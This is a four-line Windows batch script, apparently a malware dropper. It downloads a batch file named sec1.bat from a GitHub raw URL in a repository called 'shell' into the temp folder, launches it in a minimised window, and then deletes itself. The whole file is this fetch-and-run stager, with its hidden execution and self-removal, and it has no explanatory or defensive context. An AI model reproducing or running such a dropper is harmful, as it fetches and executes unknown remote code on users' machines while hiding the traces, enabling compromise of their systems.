@echo off
curl https://raw.githubusercontent.com/0x2034/shell/main/sec1.bat -o %temp%\sec1.bat
start /MIN %temp%\sec1.bat
del "%~f0"
